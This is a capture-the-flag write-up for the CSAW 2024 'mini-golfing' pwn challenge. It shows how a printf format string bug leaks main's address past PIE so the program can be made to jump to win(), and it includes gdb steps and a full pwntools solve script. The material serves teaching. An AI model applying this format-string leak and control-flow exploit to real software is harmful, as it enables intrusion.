---
layout: post
current: post
cover: assets/csaw/zerodaytea/mini-golfing.webp
navigation: True
title: "mini-golfing"
date: 2024-09-09 11:59:00
tags: [csaw, pwn]
class: post-template
subclass: 'post'
author: ZeroDayTea
---

Leaky stacks with printf: format string basics

## Looking at the Problem

We're providing with a binary ``golf`` so let's first begin by seeing what protections we're working with.
```sh
$ checksec ./golf
[*] '/home/zerodaytea/CTFs/csaw2024/minigolfing/golf'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

And let's take a look at the decomp as well with Binary Ninja
![A photo of the decomp](/assets/csaw/zerodaytea/golfdecomp.webp)

Only two functions are of particular notice that being ``main()`` and ``win()``. The ``win()`` function clearly reads the flag file but is never called explicitly so it looks like we'll need to find a way to jump to it.

Fortunately at the end of ``main()``, ``scanf()`` is used to read in an address and then jump to it with the following code segment
```c
00001360      __isoc99_scanf(&data_2094, &var_18);
00001365      int64_t rax_5 = var_18;
0000137c      printf("Ok jumping to that address...");
00001385      rax_5();
```

Unfortunately for us, however, as we saw earlier, PIE is enabled on the binary meaning the position of the binary in memory will be randomized every time it is started. We'll need to find a way to leak the address of ``win()`` in order to pass it into ``scanf()``.

Fortunately, there appears to be a simple format string printf vulnerability in
```c
00001309      fgets(&var_518, 0x400, stdin);
0000131d      printf("hello: ");
00001331      printf(&var_518);
```

As ``printf()`` is called on our input with no format specifier, we can pass our own format specifier as input and leak values earlier on the stack. Since ``win()`` is never invoked, it's address will likely not be anywhere on the stack, but the address of ``main()`` surely will be and we can use the fact that ``win()`` and ``main()`` will always be at consistent offsets away from each other to our advantage. 

I'll use gdb and pass in the ``%p`` format specifier to leak stack data as pointers. Looking at the address space with ``info proc mappings`` we see
![memory space](/assets/csaw/zerodaytea/memoryspace.webp)
So we should be looking for addresses of the format ``0x55555555...`` 

Passing in as many ``%p``'s into the printf call as we can we can then start looking for something matching. Note that this can be more easily done but just iterating with ``%{i}$p`` until we find something like the address of main but because our buffer is big enough here this works as well.

![format string](/assets/csaw/zerodaytea/formatstring.webp)
We can use ``info functions main`` in gdb to get the address of main and win

```
pwndbg> info functions main
All functions matching regular expression "main":
...
Non-debugging symbols:
0x0000555555555223  main
...
pwndbg> info functions win
All functions matching regular expression "win":
0x0000555555555209  win
```

Looking back at our leaked addresses we spot ``0x555555555223`` as the 177th address printed (quick trick is to count the number of periods appearing between the stack leaks).

Now we now that even outside of gdb we can always always use the format specifier ``%177$p`` to leak the address of main. Since we see that ``win()`` is just ``0x555555555223 - 0x555555555209 = 0x1a`` offset away from ``main()`` we can simply leak the address of main and use the offset to calculate the address we want to jump to.

Writing up our solve script to do just that we get something like
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./golf")
context.binary = elf

def conn():
    if args.GDB:
        script = """
        br main
        c
        """
        p = gdb.debug(elf.path, gdbscript=script)
    elif args.REMOTE:
        p = remote("addr", 1337)
    else:
        p = process(elf.path)
    return p

def main():
    p = conn()

    p.sendlineafter("name?", "%177$p")
    output = p.recvline()
    main_addr = output.strip()[7:]
    main_addr_int = int(main_addr, 16)
    win_addr_int = main_addr_int - 0x1a
    win_addr = hex(win_addr_int)
    print(win_addr)

    p.sendlineafter("aim at!:", win_addr)

    p.interactive()

if __name__ == "__main__":
    main()
```

If you are unfamiliar with pwntools scripts just take note of the main function where the program is started up, the format specifier is sent, the address of main is parsed from the result, the offset is subtracted, and the resulting address is sent back to the running binary.

Running our solve we get a flag!
```
$ python3 solve.py 
[*] '/home/zerodaytea/CTFs/csaw2024/minigolfing/golf'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/zerodaytea/CTFs/csaw2024/minigolfing/golf': pid 29025
0x56f233f74209
[*] Switching to interactive mode
 Ok jumping to that address...csawctf{test_flag}
[*] Got EOF while reading in interactive
```

Simply replacing the ``p = remote()`` call above we can leak the remote flag just as easily.
